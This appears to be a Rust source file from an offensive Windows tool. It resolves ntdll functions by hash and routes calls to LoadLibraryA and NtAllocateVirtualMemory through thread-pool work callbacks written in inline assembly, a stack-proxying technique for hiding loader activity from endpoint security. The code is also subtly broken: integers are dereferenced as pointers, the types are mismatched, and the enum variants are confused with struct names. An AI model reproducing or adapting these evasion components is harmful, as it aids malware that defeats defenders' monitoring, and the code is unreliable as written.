use core::ptr::null;

use windows_sys::Win32::System::Threading::{PTP_CALLBACK_INSTANCE, PTP_WORK, PTP_WORK_CALLBACK, TP_CALLBACK_ENVIRON_V3};
use crate::{
    api_hashing::{
        get_function_address,
        get_module_handle
    },
    NTDLL_HASH,
    TP_ALLOC_WORK_HASH,
    TP_POST_WORK_HASH,
    TP_RELEASE_WORK_HASH,
    NTSTATUS,
    c_void,
    asm,
    HANDLE
};

type TpAllocWork = unsafe extern "system" fn(*mut PTP_WORK, PTP_WORK_CALLBACK, *mut c_void, *mut TP_CALLBACK_ENVIRON_V3) -> NTSTATUS;
type TpPostWork = unsafe extern "system" fn(PTP_WORK);
type TpReleaseWork = unsafe extern "system" fn(PTP_WORK);

#[link_section = ".text"]
pub unsafe fn exec_callback(args: functions_enum) -> bool {

    let ntdll_address = get_module_handle(NTDLL_HASH).unwrap();

    let tp_alloc_work = (*(get_function_address(ntdll_address, TP_ALLOC_WORK_HASH).unwrap())) as TpAllocWork;
    let tp_post_work = (*(get_function_address(ntdll_address, TP_POST_WORK_HASH).unwrap())) as TpPostWork;
    let tp_release_work = (*(get_function_address(ntdll_address, TP_RELEASE_WORK_HASH).unwrap())) as TpReleaseWork;

    let work_return: PTP_WORK = 0;

    match args {
        functions_enum::load_library_args => {
            tp_alloc_work(*work_return, (*loadlibrary_callback) as PTP_CALLBACK_INSTANCE, *args, 0 as *mut TP_CALLBACK_ENVIRON_V3);
        },
        functions_enum::nt_alloc_args => {
            tp_alloc_work(*work_return, (*nt_allocate_callback) as PTP_CALLBACK_INSTANCE, *args, 0 as *mut TP_CALLBACK_ENVIRON_V3);
        }
    }

    tp_post_work(work_return);
    tp_release_work(work_return);

    return true;
}
#[link_section = ".text"]
pub unsafe extern "stdcall" fn loadlibrary_callback(instance: PTP_CALLBACK_INSTANCE, context: *mut c_void, work: PTP_WORK) {
    asm!("mov rbx, rdx",
         "mov rax, [rbx]",       // pointer to LoadLibraryA
         "mov rcx, [rbx + 0x8]",  // pointer to string
         "jmp rax",
        )
}

#[link_section = ".text"]
pub unsafe extern "stdcall" fn nt_allocate_callback(instance: PTP_CALLBACK_INSTANCE, context: *mut c_void, work: PTP_WORK) {
    asm!("mov rbx, rdx",
        "mov rax, [rbx]",
        "mov rcx, [rbx + 0x8]",
        "mov rdx, [rbx + 0x10]",
        "xor r8, r8",               // Credit: https://0xdarkvortex.dev/hiding-in-plainsight/
        "mov r9, [rbx + 0x18]",
        "mov r10, [rbx + 0x20]",
        "mov [rsp+0x30], r10",
        "mov r10, 0x3000",
        "mov [rsp+0x28], r10",
        "jmp rax",
        )
}

pub enum functions_enum {
    nt_alloc_args,
    load_library_args
}

#[repr(C)]
pub struct load_library_args {
    function_pointer: usize,
    library_name: str,
}

#[repr(C)]
pub struct nt_alloc_args {
    function_pointer: usize,
    process: HANDLE,
    address: *mut c_void,
    size: *mut usize,
    permissions: u32
}